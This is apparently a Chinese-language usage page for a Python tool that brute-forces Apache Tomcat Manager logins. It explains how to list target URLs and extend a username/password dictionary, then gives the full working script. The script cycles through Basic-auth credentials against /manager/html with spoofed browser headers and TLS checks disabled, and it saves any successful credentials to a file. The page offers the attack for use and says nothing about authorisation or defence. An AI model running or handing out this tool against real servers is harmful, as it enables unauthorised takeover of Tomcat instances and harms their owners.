## 配置
url.txt填上你要爆破的tomcat url
![image.png](https://cdn.nlark.com/yuque/0/2023/png/12847038/1693473065979-217ab2ce-3c4a-4bf8-b74c-70ed526cba77.png#averageHue=%23d2ab70&clientId=u4628ae19-ad0e-4&from=paste&height=269&id=uddf2da0b&originHeight=336&originWidth=817&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26368&status=done&style=none&taskId=u755509ca-76f7-4af6-a096-39e4fb1e8e5&title=&width=653.6)
爆破字典可以自行增加
![image.png](https://cdn.nlark.com/yuque/0/2023/png/12847038/1693473238692-b92f4e45-72d5-4d1b-a984-cfb1ad2ee689.png#averageHue=%23292928&clientId=u4628ae19-ad0e-4&from=paste&height=606&id=uf904307f&originHeight=758&originWidth=913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47833&status=done&style=none&taskId=u91c7156b-39d9-435d-b6c5-33bfef0ac29&title=&width=730.4)
## 示例
爆破成功会自动停止，并且将结果写入到txt中
![image.png](https://cdn.nlark.com/yuque/0/2023/png/12847038/1693472922665-9a5c56df-7581-4a03-a002-9f74a0139f3c.png#averageHue=%232c2b2b&clientId=u4628ae19-ad0e-4&from=paste&height=221&id=uedefcf89&originHeight=276&originWidth=1141&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58695&status=done&style=none&taskId=u3f560525-7421-47a5-ae7f-4409da010ae&title=&width=912.8)
爆破成功会自动停止
## 代码
```python
# -*- coding: utf-8 -*-
import time

import requests
import base64
import yaml
from cprint import cprint
import urllib3
urllib3.disable_warnings()
uri="/manager/html"

def read_config_file(config_file):
    with open(config_file, 'r') as file:
        config = yaml.safe_load(file)
    return config

def check_files_for_keywords(config):
    keywords = config['Keywords']
    return keywords

# 用法示例
config_file = 'userpwddic.yaml'  # 替换为你的配置文件路径
config = read_config_file(config_file)
keys=check_files_for_keywords(config)

def run():
    urllist = open("url.txt")
    urllist = urllist.readlines()
    for url in urllist:
        url = url.replace("\n", "")
        all = url + uri
        for key in keys:
            userpwd = base64.b64encode(key.encode('utf-8')).decode('utf-8')
            burp0_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not=A?Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?0",
                f"Authorization": f"Basic {userpwd}"}
            try:
                req = requests.get(all, headers=burp0_headers, verify=False, timeout=3)
                time.sleep(0.8)
                userpwd_decode = base64.b64decode(userpwd).decode('utf-8')
                if req.status_code ==200 and "Tomcat Web Application Manager" in req.text:
                    cprint.info(f"[+]{all}爆破成功,用户名密码为：{userpwd_decode}，并且写入bp_success.txt")
                    bp_yes = f"{url}\t{userpwd_decode}"
                    f_success = open('bp_success.txt', 'a+')
                    f_success.write(bp_yes + '\n')
                    f_success.close()
                    break #爆破成功会停止
                else:
                    cprint.err(f"[-]{all}用户名密码为{userpwd_decode}爆破失败")
            except:
                cprint.err(f"{url}[-]请求异常")
            # one_tomcatbp(all,encoded_content)
if __name__=="__main__":
    run()


```
